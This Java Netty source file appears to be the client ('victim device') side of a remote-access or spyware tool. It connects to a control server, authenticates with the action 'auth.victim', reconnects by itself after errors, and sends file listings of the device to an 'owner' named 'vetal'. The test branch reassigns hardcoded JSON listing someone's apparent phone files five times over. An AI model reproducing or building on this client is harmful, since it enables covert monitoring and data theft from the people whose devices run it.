package client;

import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import java.net.SocketAddress;
import java.util.ArrayList;

public class VictimDeviceHandler extends ChannelInboundHandlerAdapter {
    private ChannelHandlerContext ctx;

    @Override
    public void channelActive(ChannelHandlerContext ctx) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println("Успешно подключились! ("+address+")");
        this.ctx = ctx;
        //ArrayList<String> owners = new ArrayList<>();
        //owners.add("vetal");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("action", "auth.victim");
        jsonObject.put("name", "vika");
        //jsonObject.put("owners", owners);
        sendMessage(jsonObject);
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        System.out.println("Server >> " + msg);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        ctx.channel().close();
        System.out.println("Отключились от сервера!");
        VictimDevice.getInstance().run();
    }

    public void sendMessage(JSONObject message) {
        if (!ctx.channel().isActive()) System.out.println("Нет соединения с сервером!");
        else {
            if (message.get("action").equals("test")) {
                String json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\",\"runtastic_push-up_full-1455468346-www.androeed.ru____.apk\",\"runtastic_situps_pro-1380600007-www.androeed.ru---_.zip\",\"unknown.png\",\"unknown-1.png\",\"unknown-2.png\",\"QIP_Shot_-_Screen_049.png\",\"QIP_Shot_-_Screen_048.png\",\"report 27 февр 2018-6 марта 2018.html\",\"vk4-0.apk\",\"vk-4-5.apk\",\"vkontakte-1518370972-www.androeed.ru.apk\",\"report 6 февр 2018-6 марта 2018.html\",\"anon-4372866.png\",\"Memrise_com.memrise.android.memrisecompanion.apk\",\"runtastic_six_pack_abs_workout_-1383766033-www.androeed.ru----.zip\",\"20180405195225_1.jpg\",\"unknown-3.png\",\"pokemon-go-0-99-2.apk\",\"app-debug.apk\",\"com-mod-learn-english-with-aba-english-premium-v2-5-4-1-unlocked.146.apk\",\"android.apk\",\"sps.apk\",\"GameGuardian-1522431884-www.androeed.ru.apk\",\"VkurseClient.apk\",\"report 27 апр 2018-27 мая 2018.html\",\"htmlimage\"]}";
                json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\",\"runtastic_push-up_full-1455468346-www.androeed.ru____.apk\",\"runtastic_situps_pro-1380600007-www.androeed.ru---_.zip\",\"unknown.png\",\"unknown-1.png\",\"unknown-2.png\",\"QIP_Shot_-_Screen_049.png\",\"QIP_Shot_-_Screen_048.png\",\"report 27 февр 2018-6 марта 2018.html\",\"vk4-0.apk\",\"vk-4-5.apk\",\"vkontakte-1518370972-www.androeed.ru.apk\",\"report 6 февр 2018-6 марта 2018.html\",\"anon-4372866.png\",\"Memrise_com.memrise.android.memrisecompanion.apk\",\"runtastic_six_pack_abs_workout_-1383766033-www.androeed.ru----.zip\",\"20180405195225_1.jpg\",\"unknown-3.png\",\"pokemon-go-0-99-2.apk\",\"app-debug.apk\",\"com-mod-learn-english-with-aba-english-premium-v2-5-4-1-unlocked.146.apk\",\"android.apk\",\"sps.apk\",\"GameGuardian-1522431884-www.androeed.ru.apk\",\"VkurseClient.apk\",\"htmlimage\"]}";
                json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\",\"runtastic_push-up_full-1455468346-www.androeed.ru____.apk\",\"runtastic_situps_pro-1380600007-www.androeed.ru---_.zip\",\"unknown.png\",\"unknown-1.png\",\"unknown-2.png\",\"QIP_Shot_-_Screen_049.png\",\"QIP_Shot_-_Screen_048.png\",\"report 27 февр 2018-6 марта 2018.html\",\"vk4-0.apk\",\"vk-4-5.apk\",\"vkontakte-1518370972-www.androeed.ru.apk\",\"report 6 февр 2018-6 марта 2018.html\",\"anon-4372866.png\",\"Memrise_com.memrise.android.memrisecompanion.apk\",\"runtastic_six_pack_abs_workout_-1383766033-www.androeed.ru----.zip\",\"20180405195225_1.jpg\",\"unknown-3.png\",\"pokemon-go-0-99-2.apk\",\"app-debug.apk\",\"com-mod-learn-english-with-aba-english-premium-v2-5-4-1-unlocked.146.apk\",\"android.apk\",\"sps.apk\",\"GameGuardian-1522431884-www.androeed.ru.apk\",\"htmlimage\"]}";
                json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\",\"runtastic_push-up_full-1455468346-www.androeed.ru____.apk\",\"runtastic_situps_pro-1380600007-www.androeed.ru---_.zip\",\"unknown.png\",\"unknown-1.png\",\"unknown-2.png\",\"QIP_Shot_-_Screen_049.png\",\"QIP_Shot_-_Screen_048.png\",\"report 27 февр 2018-6 марта 2018.html\",\"vk4-0.apk\",\"vk-4-5.apk\",\"vkontakte-1518370972-www.androeed.ru.apk\",\"report 6 февр 2018-6 марта 2018.html\",\"anon-4372866.png\",\"Memrise_com.memrise.android.memrisecompanion.apk\",\"runtastic_six_pack_abs_workout_-1383766033-www.androeed.ru----.zip\",\"20180405195225_1.jpg\",\"unknown-3.png\",\"pokemon-go-0-99-2.apk\",\"app-debug.apk\",\"com-mod-learn-english-with-aba-english-premium-v2-5-4-1-unlocked.146.apk\",\"android.apk\",\"sps.apk\"]}";
                json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\",\"runtastic_push-up_full-1455468346-www.androeed.ru____.apk\",\"runtastic_situps_pro-1380600007-www.androeed.ru---_.zip\",\"unknown.png\",\"unknown-1.png\",\"unknown-2.png\",\"QIP_Shot_-_Screen_049.png\",\"QIP_Shot_-_Screen_048.png\",\"report 27 февр 2018-6 марта 2018.html\",\"vk4-0.apk\",\"vk-4-5.apk\",\"vkontakte-1518370972-www.androeed.ru.apk\",\"report 6 февр 2018-6 марта 2018.html\",\"anon-4372866.png\",\"Memrise_com.memrise.android.memrisecompanion.apk\",\"runtastic_six_pack_abs_workout_-1383766033-www.androeed.ru----.zip\",\"20180405195225_1.jpg\"]}";
                //json = "{\"owner\":\"vetal\",\"action\":\"get.file.list\",\"files\":[\"runtastic_squats_pro-1408376083-www.androeed.ru--___.zip\"]}";
                System.out.println("Server << " + json);
                JSONParser parser = new JSONParser();
                try {
                    JSONObject msg = (JSONObject) parser.parse(json);
                    ctx.writeAndFlush(msg);
                } catch (ParseException e) {
                    e.printStackTrace();
                }
            } else {
                System.out.println("Server << " + message);
                ctx.writeAndFlush(message);
            }
        }
    }
}